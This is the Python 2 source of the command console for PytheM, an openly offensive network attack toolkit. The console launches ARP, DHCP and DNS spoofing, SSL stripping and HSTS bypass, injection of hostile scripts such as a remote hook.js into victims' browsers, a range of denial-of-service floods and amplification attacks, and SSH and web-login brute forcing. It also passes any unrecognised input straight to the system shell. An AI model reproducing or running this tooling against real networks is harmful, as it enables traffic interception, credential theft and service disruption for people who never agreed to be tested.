#!/usr/bin/env python2.7
#coding=UTF-8

# Copyright (c) 2016 Angelo Moura
#
# This file is part of the program PytheM
#
# PytheM is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from modules.utils import *
from modules.completer import Completer
import os,sys
import termcolor
import readline
import psutil
import threading
from time import sleep
class Processor(object):
	name = "Interface-Processor"
	desc = "Console to process commands"
	version = "1.4"


	def __init__(self):
		#Script path
		self.path = os.path.abspath(os.path.dirname(sys.argv[0]))

		#Variables
		self.targets = None
		self.file = None
		self.interface = None
		self.gateway = None
		self.port = 80
		self.domain = None
		self.redirect = None
		self.script = None
		self.filter = None
		self.arpmode = "rep"

		#Status
		self.arpspoof_status = False
		self.dnsspoof_status = False
		self.dhcpspoof_status = False
		self.inject_status = False
		self.dnsdrop_status = 0
		self.dnsamplification_status = 0
		self.synflood_status = 0
		self.udpflood_status = 0
		self.dnsflood_status = 0
		self.pingofdeath_status = 0
		self.icmpflood_status = 0
		self.icmpsmurf_status = 0
		self.dhcpstarvation_status = 0
		self.teardrop_status = 0
		self.sslkill_status = False

		# Recursive "shell=True" process killing
	def pskill(self, proc_pid):
        	process = psutil.Process(proc_pid)
        	for proc in process.children(recursive=True):
        	        proc.kill()
        	process.kill()


		# Main
	def start(self):
		try:
        	        animation = "|/-\\"
	                for i in range(15):
        	            time.sleep(0.1)
        	            sys.stdout.write("\r" + "[" + animation[i % len(animation)] + "]" + "PytheM is loading ...")
        	            sys.stdout.flush()
			print
				#Untill break or CTRL+C
			while 1:
					#Call the object Completer code in modules/completer.py
				completer = Completer("pythem")
					#Use termocolor import to set the default commandline red
				console = termcolor.colored("pythem>","red", attrs=["bold"])
					#Iterable console shell commands with the while 1
				self.command = raw_input("{} ".format(console))
					# Separate the user input by spaces " ", can use like this too: self.input_list = [str(a) for a in self.argv] 
				self.input_list = self.command.split()
				try:

						# HELP
					if self.command == "help":
						print_help()

						# EXIT
					elif self.command == "exit" or self.command == "quit":
						print "[*] User requested shutdown."
						if self.dnsdrop_status == 1:
							self.dos.dnsdropstop()
						if self.sslkill_status == True:
							print "[*] SSLKill finalized."
					                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                					os.system('iptables -t nat -F')
						if self.arpspoof_status == True:
							iptables()
							set_ip_forwarding(0)
						exit()

						# HSTSBYPASS
					elif self.command == "hstsbypass":
						from modules.sslkill import Proxy,SSLKiller,SSLStripRequestHandler
						def HSTSbypass():
        		                        	sslkill = SSLKiller(self.interface, self.targets, self.gateway)
        		                                Proxy(HandlerClass=SSLStripRequestHandler)
						if self.targets and self.gateway and self.interface:
							try:
								self.sslkill_status = True
                						os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080")
								ht = threading.Thread(name='HSTSbypass', target=HSTSbypass)
								ht.setDaemon(True)
								ht.start()
								sleep(5)
								#print "[*] SSLKill initialized"
								#print "      |_by: m4n3dw0lf"
							except Exception as e:
								print "[!] Exception caught: {}".format(e)

						else:
							print "[!] You need to set a target, interface and gateway before starting SSLKill."


					elif self.command == "hstsbypass help":
						print "\n[Help] Start to perform a HSTS Bypass with SSLKill"
						print "[Required] Interface, Gateway and Target"
						print "example:"
						print "{} set interface eth0".format(console)
						print "{} set gateway 10.0.0.1".format(console)
						print "{} set target 10.0.0.3".format(console)
						print "{} hstsbypass\n".format(console)


					elif self.input_list[0] == "set" or self.input_list[0] == "SET":
						try:
							if self.input_list[1] == "interface":
								try:
									self.interface = self.input_list[2]
								except IndexError:
									try:
										self.interface = raw_input("[+] Enter the interface: ")
									except KeyboardInterrupt:
										pass
							elif self.input_list[1] == "port":
								try:
									self.port = int(self.input_list[2])
								except IndexError:
									try:
										self.port = input("[+] Enter the default port: ")
									except KeyboardInterrupt:
										pass

							elif self.input_list[1] == "domain":
								try:
									self.domain = self.input_list[2]
								except IndexError:
									try:
										self.domain = raw_input("[+] Domain to be spoofed: ")
									except KeyboardInterrupt:
										pass

							elif self.input_list[1] == "redirect":
								try:
									self.redirect = self.input_list[2]
								except IndexError:
									try:
										self.redirect = raw_input("[+] IP address to redirect DNS queries: ")
									except KeyboardInterrupt:
										pass

							elif self.input_list[1] == "script":
								try:
									self.script = self.input_list[2]
								except IndexError:
									try:
										self.script = raw_input("[+]Script url/path: ")
									except KeyboardInterrupt:
										pass


							elif self.input_list[1] == "gateway":
								try:
									self.gateway = self.input_list[2]
								except IndexError:
									try:
										self.gateway = raw_input("[+] Enter the gateway: ")
									except KeyboardInterrupt:
										pass
							elif self.input_list[1] == "target":
								try:
									self.targets = self.input_list[2]
								except IndexError:
									try:
										self.targets = raw_input("[+] Enter the target(s): ")
									except KeyboardInterrupt:
										pass
							elif self.input_list[1] == "file":
								try:
									self.file = self.input_list[2]
								except IndexError:
									try:
										self.file = raw_input("[+] Enter the path to the file: ")
									except KeyboardInterrupt:
										pass
							elif self.input_list[1] == "arpmode":
								try:
									self.arpmode = self.input_list[2]
								except IndexError:
									try:
										self.arpmode = raw_input("[+] Enter the arpmode: ")
									except KeyboardInterrupt:
										pass

							elif self.input_list[1] == "filter":
								try:
									self.filter = self.input_list[2]
								except IndexError:
									try:
										self.filter = raw_input("[+] Enter the sniffer filter: ")
									except KeyboardInterrupt:
										pass

							elif self.input_list[1] == "help":
								print "\n[Help] Select a variable to set."
								print "parameters:"
								print " - interface"
								print " - gateway"
								print " - target"
								print " - file"
								print " - arpmode"
								print " - domain"
								print " - redirect"
								print " - script"
								print " - filter"
								print "example:"
								print "{} set interface\n".format(console)

						except IndexError:
							print "[!] Select a valid variable to set."


					elif self.input_list[0] == "print":
						try:
							if self.input_list[1] == "interface":
								print "[+] Network Interface: {}".format(self.interface)
							elif self.input_list[1] == "port":
								print "[+] Default port: {}".format(self.port)
							elif self.input_list[1] == "domain":
								print "[+] Domain: {}".format(self.domain)
							elif self.input_list[1] == "redirect":
								print "[+] Redirecting to: {}".format(self.redirect)
							elif self.input_list[1] == "script":
								print "[+] Script url/path: {}".format(self.script)
							elif self.input_list[1] == "gateway":
								print "[+] Gateway IP Address: {}".format(self.gateway)
							elif self.input_list[1] == "target":
								print "[+] Target(s): {}".format(self.targets)
							elif self.input_list[1] == "file":
								print "[+] File path: {}".format(self.file)
							elif self.input_list[1] == "arpmode":
								print "[+] ARP spoofing mode: {}".format(self.arpmode)
							elif self.input_list[1] == "help":
								print "\n[Help] Print a variable value."
								print "example:"
								print "{} print interface\n".format(console)
						except IndexError:
							print "[!] Select a valid variable name."

					elif self.input_list[0] == "scan":
						try:
							if self.input_list[1] == "help":
								print "\n[Help] Start a scanner in target host."
								print "[Required] interface and target"
								print "parameters:"
								print " - tcp"
								print " - arp"
								print " - manual"
								print "example:"
								print "{} set target www.google.com".format(console)
								print "{} set interface eth0".format(console)
								print "{} scan tcp\n".format(console)
								continue
							mode = self.input_list[1]
							if self.targets is not None and self.interface is not None:
								from modules.scanner import Scanner
								self.scan = Scanner(self.targets, self.interface, mode)
								self.scan.start()
							else:
								print "[!] You probably forgot to set the interface or a valid IP address/range."
						except IndexError:
							try:
								print "[*] Select one scan mode, options = tcp/arp/manual"
								mode = raw_input("[+] Scan mode: ")
							except KeyboardInterrupt:
								pass
							if self.targets is not None and self.interface is not None:
								from modules.scanner import Scanner
								self.scan = Scanner(self.targets, self.interface, mode)
								self.scan.start()
							else:
								print "[!] You probably forgot to set the interface or a valid IP address/range."
								pass

						except KeyboardInterrupt:
							pass
						except Exception as e:
							print "[!] Exception caught: {}".format(e)
							pass

					elif self.input_list[0] == "arpspoof":
                                        	try:
							if self.input_list[1] == "start":
	                                                	from modules.arpoisoner import ARPspoof
						                myip = get_myip(self.interface)
	                					mymac = get_mymac(self.interface)
								self.arpspoof_status = True
								self.spoof = ARPspoof(self.gateway, self.targets, self.interface,self.arpmode ,myip, mymac)
								self.spoof.start()
								print "[+] ARP spoofing initialized."

							elif self.input_list[1] == "stop":
								self.spoof.stop()
								self.arpspoof_status = False
								print "[+] ARP spoofing finalized."

                                                        elif self.input_list[1] == "status":
                                                                if self.arpspoof_status:
                                                                        stat = "running"
                                                                else:
                                                                        stat = "down"
                                                                print "[*] ARP spoofing status: {}".format(stat)

							elif self.input_list[1] == "help":
								print "\n[Help] Start a ARP spoofing attack."
								print "[Optional] set arpmode with rep to spoof with responses and req to spoof with requests"
								print "parameters:"
								print " - start"
								print " - stop"
								print " - status"
								print " - help"
								print "example:"
								print "{} set interface eth0".format(console)
								print "{} set gateway 192.168.0.1".format(console)
								print "{} arpspoof start\n".format(console)
								continue

							else:
								print "[!] Select a valid option, call help to check syntax."
						except TypeError:
							print "[!] You probably forgot to set interface or gateway."
						except IndexError:
							print "[!] You probably forgot to type start or stop after arpspoof."
						except AttributeError:
							pass
						except Exception as e:
							print "[!] Exception caught: {}".format(e)

					elif self.input_list[0] == "dhcpspoof":
						try:
							if self.input_list[1] == "start":
								from modules.dhcpoisoner import DHCPspoof
								self.dhcpspoof_status = True
								self.dhcpspoof = DHCPspoof("silent")
								print "[+] DHCP spoofing initialized."

							elif self.input_list[1] == "stop":
								print "[+] DHCP spoofing finalized."
								exit(0)

							elif self.input_list[1] == "status":
								if self.dhcpspoof_status:
									stat = "running"
								else:
									stat = "down"
								print "[*] DHCP spoofing status: {}".format(stat)

							elif self.input_list[1] == "help":
								print "\n[Help] Start a DHCP ACK Injection spoofing attack."
								print "parameters:"
								print " - start"
								print " - stop"
								print " - status"
								print " - help"
								print "example:"
								print "{} dhcpspoof start\n".format(console)
								continue
							else:
								print "[!] Select a valid option, call help to check syntax."
						except IndexError:
							print "[!] You probably forgot to type start, stop, status or help after dhcpspoof."
						except Exception as e:
							print "[!] Exception caught: {}".format(e)


					elif self.input_list[0] == "dnsspoof":
						try:

							if self.input_list[1] == "start":
								if not self.arpspoof_status:
									print "[!] You probably forgot to start an ARP spoofing."
									continue
								if self.domain != None :
									domain = self.domain
								else:
									try:
										domain = raw_input("[!] Type all to spoof all domains\n[+] Domain to be spoofed: ")
										self.domain = domain
									except KeyboardInterrupt: pass

								if self.redirect != None:
									redirect = self.redirect
								else:
									myip = get_myip(self.interface)
									opt = raw_input("[+] Default address to redirect is:{} do you want to change?[y/n]".format(myip))
									if opt == "y" or opt == "Y" or opt == "yes" or opt == "YES": 
										try:redirect = raw_input("[+] IP address to be redirected: ")
										except KeyboardInterrupt: pass
									else:
										redirect = myip

								from modules.dnspoisoner import DNSspoof
								self.dnsspoof = DNSspoof(redirect)
								self.dnsspoof.start(domain,None)
								print "[+] DNS spoofing initialized"
								self.dnsspoof_status = True

							elif self.input_list[1] == "stop":
								self.dnsspoof.stop()
								self.dnsspoof_status = False
								print "[+] DNS spoofing finalized"

                                                        elif self.input_list[1] == "status":
                                                                if self.dnsspoof_status:
                                                                        stat = "running"
                                                                else:
                                                                        stat = "down"
                                                                print "[*] DNS spoofing status: {}".format(stat)

							elif self.input_list[1] == "help":
								print "\n[Help] Start to DNS spoof."
								print "[Required] ARP spoof started."
								print "parameters:"
								print " - start"
								print " - stop"
								print " - status"
								print " - help"
								print "example:"
								print "{} dnsspoof start".format(console)
								print "[!] Type all to spoof all domains"
								print "[+] Domain to be spoofed: www.google.com\n"
								continue


							else:
								print "[!] Select a valid option, call help to check syntax."
						except IndexError:
							print "[!] You probably forgot to type start or stop after dnsspoof."
						except Exception as e:
							print "[!] Exception caught: {}".format(e)

					elif self.input_list[0] == "inject":
						try:
							if self.input_list[1] == "start":
								myip = get_myip(self.interface)
								try:
									from modules.inject import Inject
									self.inject = Inject(myip,self.port,self.script)
									self.inject_status = True
									self.inject.server()
								except AttributeError:
									print "\n[!] Select a valid script source path or url."
								except Exception as e:
									print "[!] Exception caught: {}".format(e)

							elif self.input_list[1] == "stop":
								try:
									self.inject.stop()
									self.inject_status = False
								except Exception as e:
									print "[!] Exception caught: {}".format(e)

							elif self.input_list[1] == "status":
								if self.inject_status:
									stat = "running"
								else:
									stat = "down"
								print "[*] Script injection status: {}".format(stat)

							elif self.input_list[1] == "help":
								print "\n[Help] Start to inject a source script into target browser."
								print "[Required] ARP spoof started."
								print "parameters:"
								print " - start"
								print " - stop"
								print " - status"
								print " - help"
								print "example:"
								print "{} inject start".format(console)
  								print "[+] Enter the script source: http://192.168.1.6:3000/hook.js\n"
								continue

							else:
								print "[!] You need to specify  start, stop or status after the inject module call."
						except IndexError:
							print "[!] You probably forgot to start or stop the inject module."
						except TypeError:
							print "[!] You probably forgot to start an arpspoof attack ."
						except Exception as e:
							print "[!] Exception caught: {}".format(e)

					elif self.input_list[0] == "dos":
						from modules.jammer import Jam
						self.dos = Jam()
						try:
							if self.input_list[1] == "dnsdrop":
								try:
									if self.input_list[2] == "help":
										print "\n[Help] Start to drop DNS queries that pass through man-in-the-middle traffic."
										print "[Required] ARP spoof started"
										print "example:"
										print "{} dos dnsdrop\n".format(console) 
										continue
								except IndexError:
									if self.arpspoof_status:
										try:
											myip = get_myip(self.interface)
											self.dos.dnsdropstart(myip)
											self.dnsdrop_status = 1
										except Exception as e:
											print "[!] Exception caught: {}".format(e)
									else:
										print "[!] You need to start a arpspoof on a target (IP/Range) to start dnsdrop."


							elif self.input_list[1] == "dnsamplification":
								try:
									if self.input_list[2] == "help":
										print "\n[Help] Start a DNS amplification attack on target address with given DNS servers to amplificate."
										print "example:"
										print "{} set target 1.2.3.4".format(console)
										print "{} dos dnsamplification".format(console)
										print "[+] DNS Server to use in amplification attack(separated by commas): 8.8.8.8,8.8.4.4\n"
								except IndexError:
                                                                        if self.targets == None:
                                                                                print "[!] You probably forgot to set a IP address as target."
                                                                        else:
                                                                                try:
                                                                                        self.dos.dnsamplificationstart(self.targets)
                                                                                        self.dnsamplification_status = 1
                                                                                except Exception as e:
                                                                                        print "[!] Exception caught: {}".format(e)


							elif self.input_list[1] == "dhcpstarvation":
								try:
									if self.input_list[2] == "help":
										print "\n[Help] Start a DHCP starvation attack on network DHCP server. Multiple spoofed mac dhcp discovers."
										print "example:"
										print "{} dos dhcpstarvation\n".format(console)
										continue
								except IndexError:
									try:
										self.dos.dhcpstarvationstart()
										self.dhcpstarvation_status = 1
									except TypeError:
										print "[!] You probably forgot to set a network interface."

							elif self.input_list[1] == "land":
								try:
									if self.input_list[2] == "help":
										print "\n[Help] Start a LAND attack on a target."
										print "[Required] Target"
										print "[Optional] Port, default = 80"
										print "example:"
										print "{} set target 10.0.0.101".format(console)
										print "{} dos land\n".format(console)
										continue
								except IndexError:
									if self.targets == None:
										print "[!] You probably forgot to set a IP address as target."
									else:
										try:
											self.dos.landstart(self.targets,self.port)
											self.land_status = 1
										except Exception as e:
											print "[!] Exception caught: {}".format(e)

							elif self.input_list[1] == "pingofdeath":
								try:
									if self.input_list[2] == "help":
										print "\n[Help] Start a Ping of Death attack on a target."
										print "[Required] Target"
										print "example:"
										print "{} set target 192.168.1.101".format(console)
										print "{} dos pingofdeath\n".format(console)
										continue
								except IndexError:
									if self.targets == None:
										print "[!] You probably forgot to set a IP address as target."
									else:
										try:
											self.dos.pingofdeathstart(self.targets)
											self.pingofdeath_status = 1
										except Exception as e:
											print "[!] Exception caught: {}".format(e)

							elif self.input_list[1] == "udpflood":
								try:
									if self.input_list[2] == "help":
										print "\n[Help] Start a UDP flood attack on target host, default port = 80, set port to change."
										print "[Required] Target"
										print "[Optional] port"
										print "example:"
										print "{} set target 192.168.1.4".format(console)
										print "{} dos synflood\n".format(console) 
										continue
								except IndexError:

									if self.targets == None:
										print "[!] You probably forgot to set a IP address as target."
									else:
										try:
											myip = get_myip(self.interface)
											self.dos.udpfloodstart(myip,self.targets,self.port)
											self.udpflood_status = 1
										except TypeError:
											print "[!] You probably forgot to set a network interface."



							elif self.input_list[1] == "icmpflood":
								try:
									if self.input_list[2] == "help":
										print "\n[Help] Start a ICMP flood attack on target host."
										print "[Required] Target and interface"
										print "example:"
										print "{} set target 10.0.0.1".format(console)
										print "{} set interface wlan0".format(console)
										print "{} dos icmpflood\n".format(console)
										continue
								except IndexError:
									if self.targets == None:
										print "[!] You probably forgot to set a IP address as target."
									else:
										try:
											myip = get_myip(self.interface)
											self.dos.icmpfloodstart(myip,self.targets)
											self.icmpflood_status = 1
										except TypeError:
											print "[!] You probably forgot to set a network interface."

							elif self.input_list[1] == "synflood":
								try:
									if self.input_list[2] == "help":
										print "\n[Help] Start a SYN flood attack on target host, default port = 80, set port to change."
										print "[Required] Target and interface"
										print "[Optional] port"
										print "example:"
										print "{} set target 192.168.1.4".format(console)
										print "{} set interface wlan0".format(console)
										print "{} dos synflood\n".format(console) 
										continue
								except IndexError:
									if self.targets == None:
										print "[!] You probably forgot to set a IP address as target."
									else:
										try:
											myip = get_myip(self.interface)
											self.dos.synfloodstart(myip,self.targets,self.port)
											self.synflood_status = 1
										except TypeError:
											print "[!] You probably forgot to set a network interface."

							elif self.input_list[1] == "icmpsmurf":
								try:
									if self.input_list[2] == "help":
										print "\n[Help] Start a ICMP smurf attack on target host. send echo-requests with spoofed target address."
										print "[Required] Target and interface"
										print "example:"
										print "{} set target 192.168.1.4".format(console)
										print "{} set interface wlan0".format(console)
										print "{} dos icmpsmurf\n".format(console) 
										continue
								except IndexError:
									if self.targets == None:
										print "[!] You probably forgot to set a IP address as target."
									else:
										try:
											self.dos.icmpsmurfstart(self.targets)
											self.icmpsmurf_status = 1
										except Exception as e:
											print "[!] Exception caught: {}".format(e)

							elif self.input_list[1] == "teardrop":
								try:
									if self.input_list[2] == "help":
										print "\n[Help] Start a UDP teardrop fragmentation attack."
										print "[Required] Target and interface"
										print "example:"
										print "{} set interface wlan0".format(console)
										print "{} set target 192.168.0.6".format(console)
										print "{} dos teardrop\n".format(console)
										continue
								except IndexError:
									if self.targets == None:
										print "[!] You probably forgot to set a IP address as target."
									else:
										try:
											self.dos.teardrop(self.targets)
											self.teardrop_status = 1
										except Exception as e:
											print "[!] Exception caught: {}".format(e)



							elif self.input_list[1] == "help":
								print "\n[Help] Start to perform a choosen denial of service in target."
								print "[Required] Depends"
								print "parameters:"
								print " - dnsdrop"
								print " - synflood"
								print " - udpflood"
								print " - teardrop"
								print " - icmpflood"
								print " - icmpsmurf"
								print " - dhcpstarvation"
								print " - dnsamplification"
								print "example:"
								print "{} dos icmpsmurf help\n".format(console)

							else:
								print "[!] Select a valid option, type help to check syntax."


						except IndexError:
							print "[!] You probably forgot to specify the type of DoS to use."



					elif self.command == "sniff help":
						if self.input_list[1] == "help":
							print "\n[Help] Start to sniff network traffic with custom scapy filter."
							print "[Required] Interface"
							print "[Optional] Filter in tcpdump format"
							print "[Custom filters]:"
							print " - http (Quick 'port 80')"
							print " - dns  (Quick 'port 53')"
							print " - core (Core network events)"
							print "examples:"
							print "{} set interface wlan0".format(console)
							print "{} sniff port 1337 and host 192.168.1.1\n".format(console)
							continue

					elif self.input_list[0] == "sniff":
						from modules.sniffer import Sniffer
						try:
							hasfilter = self.input_list[1]
							self.filter = " ".join(self.input_list[1:])
							if self.filter == "dns":
								self.filter = "port 53"
							self.sniff = Sniffer(self.interface, self.filter,self.path)
							print "\n[+] PytheM sniffer initialized.\n"
							self.sniff.start()

						except IndexError:
							try:
								self.filter = raw_input("[+] Enter the filter(empty for core sniffer): ")
								if self.filter == "dns":
									self.filter = "port 53"
								if not self.filter:
									self.filter = None
	                                                        self.sniff = Sniffer(self.interface, self.filter,self.path)
								print "\n[+] PytheM sniffer initialized.\n"
        	                                                self.sniff.start()
							except KeyboardInterrupt:
                                                		pass

					elif self.input_list[0] == "pforensic":
						try:
							if self.input_list[1] == "help":
								print "\n[Help] Start a packet-analyzer."
								print "[Required] Set a file with a .pcap file"
								print "example:"
								print "{} set file capture.pcap".format(console)
								print "{} pforensic\n".format(console)
								continue

							else:
								print "[!] Invalid option."
						except IndexError:
							try:
								from modules.pforensic import PcapReader
								self.pcapread = PcapReader(self.file)
								self.pcapread.start()
							except KeyboardInterrupt:
								pass
							except TypeError:
								print "[!] You probably forgot to set the .pcap file"
								pass
							except Exception as e:
								print "[!] Exception caught: {}".format(e)
								pass

					elif self.input_list[0] == "xploit":
						try:
							from modules.exploit import Exploit
							if self.targets is not None and self.input_list[1] == "tcp":
								self.xploit = Exploit(self.targets, self.input_list[1])
								self.xploit.start()
							elif self.file is not None and self.input_list[1] == "stdin":
								self.xploit = Exploit(self.file, self.input_list[1])
								self.xploit.start()
							elif self.input_list[1] == "help":
								print "\n[Help] Interactive stdin or tcp exploit development shell."
								print "[Required] File as target to stdin and IP address as target to tcp"
								print "parameters:"
								print " - tcp"
								print " - stdin"
								print "example:"
								print "{} set target 192.168.1.1".format(console)
								print "{} xploit tcp\n".format(console)
							else:
								print "[!] You need to set or stdin  or  tcp as argument."
								print "[!] You need to set or a |-file or |-target to xploit."
						except IndexError:
							try:
								print "[*] Select one xploit mode, options = stdin/tcp"
								mode = raw_input("[+] Exploit mode: ")
								if mode == "stdin" or mode == "tcp":
									from modules.exploit import Exploit
									if self.targets is not None:
										self.xploit = Exploit(self.targets, mode)
										self.xploit.start()
									elif self.file is not None:
										self.xploit = Exploit(self.file, mode)
										self.xploit.start()
									else:
										print "[!] You need to set or a file or a target to xploit."
								else:
									print "[!] Select a valid xploit mode, stdin or tcp"
							except KeyboardInterrupt:
								pass
                                                except TypeError:
                                                        print "[!] You probably forgot to set the file"
                                                        pass
                                               	except KeyboardInterrupt:
                                                        pass
                                                except Exception as e:
                                                        print "[!] Exception caught: {}".format(e)
                                                        pass

					elif self.input_list[0] == "cookiedecode":
						try:
							try:
								if self.input_list[1] == "help":
                                                        	        print "\n[Help] Decode a base64 unquoted Cookie."
                                                        	      	print "example:"
                                         	        	  	print "{} cookiedecode".format(console)
                                                        	      	print "[+] Enter the cookie value:\n"
							except IndexError:
								cookiedecode()
						except KeyboardInterrupt:
							pass
						except Exception as e:
							print "[!] Exception caught: {}".format(e)
							pass


					elif self.input_list[0] == "decode":
						try:
							if self.input_list[1] == "help":
                                                        	print "\n[Help] Decode a base64 string."
                                                                print "example:"
                                                        	print "{} decode".format(console)
								print "[+] Decode: <encoding>"
                                                                print "[+] Enter the string to be decoded:\n"
								continue
							print decode(self.input_list[1])
						except IndexError:
							try:
								msg = raw_input("[+] Decode: ")
								print decode(msg)
							except KeyboardInterrupt:
								pass
						except Exception as e:
							print "[!] Exception caught: {}".format(e)

					elif self.input_list[0] == "encode":
						try:
							if self.input_list[1] == "help":
                                                        	print "\n[Help] Encode a base64 string."
                                                                print "example:"
                                                        	print "{} encode".format(console)
								print "[+] Encode: <encoding>"
                                                                print "[+] Enter the string to be encoded:\n"
								continue
							print encode(self.input_list[1])
						except IndexError:
							try:
								msg = raw_input("[+] Encode:")
								print decode(msg)
							except KeyboardInterrupt:
								pass
						except Exception as e:
							print "[!] Exception caught: {}".format(e)

					elif self.input_list[0] == "geoip":
						try:
							if self.input_list[1] == "help":
								print "\n[Help] Approximately geolocate the location of a IP address."
								print "[Required] Target IP Address"
								print "examples:"
								print "{} set target 8.8.8.8".format(console)
  								print "{} geoip".format(console)
     								print "	    or"
  								print "{} geoip 8.8.8.8".format(console)
								continue
							self.targets = self.input_list[1]
							from modules.geoip import Geoip
							path = self.path + "/config/GeoLiteCity.dat"
							iptracker = Geoip(self.targets,path)

						except IndexError:
							if self.targets is not None:
								from modules.geoip import Geoip
								path = self.path + "/config/GeoLiteCity.dat"
								iptracker = Geoip(self.targets,path)
							else:
								print "[!] You probably forgot to set a target"

						except Exception as e:
								print "[!] Exception caught: {}".format(e)
								pass

					elif self.input_list[0] == "brute":
						try:
							if self.input_list[1] == "help":
								print "\n[Help] Brute-Force attacks, good luck padawan."
								print "[Required] File as password wordlist and target as URL or IP."
								print "parameters:"
								print " - ssh"
								print " - form"
								print " - url"
								print "example:"
								print "{} brute ssh help\n".format(console)
								continue

							if self.input_list[1] == "ssh":
								try:
									if self.input_list[2] == "help":
										print "\n[Help] SSH Brute-Force"
										print "[Required] IP address as target."
										print "example:"
										print "{} set file wordlist.txt".format(console)
										print "{} set target 192.168.1.5".format(console)
										print "{} brute ssh\n".format(console)
										continue
									else:
										print "[!] Invalid option."
								except IndexError:
									try:
										username = raw_input("[+] Enter the username to bruteforce: ")
										from modules.ssh_bruter import SSHbrutus
										brutus = SSHbrutus(self.targets, username, self.file)
										brutus.start()
                                                			except KeyboardInterrupt:
										pass
                                                			except TypeError:
                                                        			print "[!] You probably forgot to set the wordlist file path."
                                                       				pass

							elif self.input_list[1] == "url":
								try:
									if self.input_list[2] == "help":
										print "\n[Help] URL Brute-Force"
										print "[Required] URL (with http:// or https://) as target"
										print "example:"
										print "{} set file wordlist.txt".format(console)
										print "{} set target http://testphp.vulnweb.com/products.php?id=".format(console)
										print "{} brute url\n".format(console)
										continue
									else:
										print "[!] Invalid option."

								except IndexError:
									try:
										url = 'url'
										from modules.web_bruter import WEBbrutus
										brutus = WEBbrutus(self.targets, self.file)
										brutus.start(url)
									except KeyboardInterrupt:
										brutus.stop(url)
										pass
									except TypeError:
			                                      			print "[!] You probably forgot to set the wordlist file path."
										pass

							elif self.input_list[1] == "form":
								try:
									if self.input_list[2] == "help":
										print "\n[Help] Formulary Brute-Force"
										print "[Required] URL (with http:// or https://) as target"
										print "example:"
										print "{} set file wordlist.txt".format(console)
										print "{} set target http://testphp.vulnweb.com/login.php".format(console)
										print "{} brute form\n".format(console)
										continue
									else:
										print "[!] Invalid option."

								except IndexError:
									try:
										form = 'form'
										from modules.web_bruter import WEBbrutus
										brutus = WEBbrutus(self.targets, self.file)
										brutus.start(form)
									except KeyboardInterrupt:
										brutus.stop(form)
										pass
									except TypeError:
		                                            			print "[!] You probably forgot to set the wordlist file path."
										pass
						except IndexError:
							print "[!] Select a valid brute force type."
					else:
						try:
							os.system("{}".format(self.command))
							pass
						except Exception as e:
							print "[!] Select a valid option, type help to check syntax."
							pass
				except IndexError:
					pass

				except Exception as e:
					print "[!] Exception caught: {}".format(e)



		except KeyboardInterrupt:
			print "\n[*] User requested shutdown."
			if self.dnsdrop_status == 1:
				self.dos.dnsdropstop()
			if self.sslkill_status == True:
				print "[*] SSLKill finalized."
                                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                                os.system('iptables -t nat -F')
			if self.arpspoof_status == True:
				iptables()
				set_ip_forwarding(0)
			exit()


